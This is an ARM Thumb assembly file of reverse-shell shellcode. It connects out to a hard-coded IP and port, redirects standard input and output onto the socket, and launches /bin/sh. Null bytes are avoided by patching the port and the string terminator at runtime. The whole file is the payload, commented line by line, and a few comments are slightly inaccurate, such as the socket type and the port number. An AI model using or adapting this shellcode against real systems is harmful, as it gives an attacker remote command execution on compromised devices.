.section	.text
.global		_start

@ ensure switching to thumb mode (arm mode instructions)
.code 32
_0:    add	r1, pc, #1
_4:    bx	r1

@ thumb mode instructions
_start:
.code 16

@ *0x52 -= 1 (port -= 0x100; make it possible to use port numbers <1024)
_8:    add	r1, pc, #68	@ r1 <- pc+68 = 0xc+68 = 0x50
_a:    ldrb	r2, [r1, #2]	@ r2 <- *0x52
_c:    sub	r2, #1	 	@ r2 <- r2-1
_e:    strb	r2, [r1, #2]	@ r2 -> *0x52

@ socket(2, 1, 0) = socket(AF_INET, SOCK_DGRAM, 0)
_10:   mov	r1, #2	 	@ r1 <- 2
_12:   add	r0, r1, #0	@ r0 <- r1 + 0 = 2
_14:   mov	r1, #1		@ r1 <- 1
_16:   sub	r2, r2, r2	@ r2 <- r2 - r2 = 0
_18:   lsl	r7, r1, #8	@ r7 <- r1<<8 = 1<<8 = 256
_1a:   add	r7, #25		@ r7 <- r7 + 25 = 281
_1c:   svc	1   		@ r0 <- svc_281(r0, r1, r2) = socket(2, 1, 0)

@ connect(r0, 0x50, 16) = connect(&socket, &struct_addr, addr_len)
_1e:   add	r6, r0, #0	@ r6 <- r0 + 0 = &socket
_20:   add	r1, pc, #44	@ r1 <- pc+44 = 0x24+44 = 0x50
_22:   mov	r3, #2		@ r3 <- 2
_24:   strh	r3, [r1, #0]	@ 2 -> *0x50
_26:   mov	r2, #16	 	@ r2 <- 16
_28:   add	r7, #2		@ r7 <- r7 + 2 = 283
_2a:   svc	1   		@ r0 <- svc_283(r0, r1, r2) = connect(&socket, 0x50, 16)

@ attach stdin/stdout/stderr to socket: dup2(r0, 0), dup2(r0, 1), dup2(r0, 2)
_2c:   mov	r7, #62		@ r7 <- 62
_2e:   add	r7, #1		@ r7 <- r7 + 1 = 63
_30:   mov	r1, #200	@ r1 <- 200

_32:   add	r0, r6, #0	@ r0 <- r6 + 0 = &socket
_34:   svc	1   		@ r0 <- svc_63(r0, r1) = dup2(&socket, 0..200)
_36:   sub	r1, #1		@ r1 <- r1 - 1
_38:   bpl	_32  		@ loop until r1>0 (dup2 every fd to the socket)

@ execve('/bin/sh', NULL, NULL)
_3a:   add	r0, pc, #28	@ r0 <- pc+28 = 0x3c+28 = 0x58
_3c:   sub	r2, r2, r2	@ r2 <- r2 - r2 = 0
_3e:   strb	r2, [r0, #7]	@ 0 -> *(0x58+7), terminate '/bin/sh' with \x00
_40:   push	{r0, r2} 	@ *sp <- {r0, r1, r2} = {0x58, 0x0, 0x0}
_42:   mov	r1, sp		@ r1 <- sp
_44:   mov	r7, #11		@ r7 <- 11
_46:   svc	1   		@ svc_11(r0, r1, r2) = execve('/bin/sh\x00', ['/bin/sh\x00', 0], 0)

_48:   mov	r7, #1		@ r7 <- 1
_4a:   add	r0, r7, #0	@ r0 <- r7 + 0 = 1
_4c:   svc	1   		@ svc_1(r0) = exit(1)

_4e:   nop

@ struct sockaddr (sa_family = 0x0002 (set by shellcode), sa_data = (port, ip) )
_50:   .short 0xffff
_52:   .short 0x697b		@ port 31377 (hex(31337+0x100) in little-endian)
_54:   .byte 192,168,88,100	@ inet addr: 192.168.88.100
_58:   .ascii "/bin/shX"	@ 'X' will be replaced with \x00 by the shellcode

.word 0xefbeadde		@ deadbeef ;)
